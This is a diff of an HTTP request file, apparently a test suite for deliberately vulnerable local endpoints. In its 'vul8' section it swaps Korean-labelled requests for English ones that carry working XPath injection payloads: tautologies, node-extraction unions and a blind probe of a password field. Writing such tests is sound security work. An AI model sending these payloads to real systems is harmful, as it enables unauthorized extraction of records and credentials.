@@ -61,17 +61,22 @@ Accept: application/json
 # @expect: 200 OK with potentially sensitive data
 
 ###vul8
-### 1. 정상 요청 (200 OK)
-GET http://localhost:3000/grades?studentId=s1001
+### 1. Basic Injection - Get All Students
+GET http://localhost:3000/grades?studentId=s1001" or "1"="1
 
-### 2. XPath 인젝션 - 모든 학생 반환 (200 OK)
-GET http://localhost:3000/grades?studentId=s1001' or '1'='1
+### 2. Get Admin Data
+GET http://localhost:3000/grades?studentId=admin
 
-### 3. XPath 인젝션 - 첫 번째 학생 추출 (200 OK)
-GET http://localhost:3000/grades?studentId=s1001'] | //student[1] | student['
+### 3. Get Password Field
+GET http://localhost:3000/grades?studentId=s1001" or contains(name,"System") or "
 
-### 4. XPath 인젝션 - 전체 데이터 추출 (200 OK)
-GET http://localhost:3000/grades?studentId=s1001'] | //* | student['
+### 4. Document Structure Discovery
+GET http://localhost:3000/grades?studentId=s1001"]|//*|//*["
+
+### 5. Blind Injection
+GET http://localhost:3000/grades?studentId=s1001" and contains(password,"sec") or "
+
+
 ### vul9
 ### 1. Normal Request - Valid Movie (Should return 200 OK)
 GET http://localhost:3000/movies/rating?movieTitle=The%20Shawshank%20Redemption
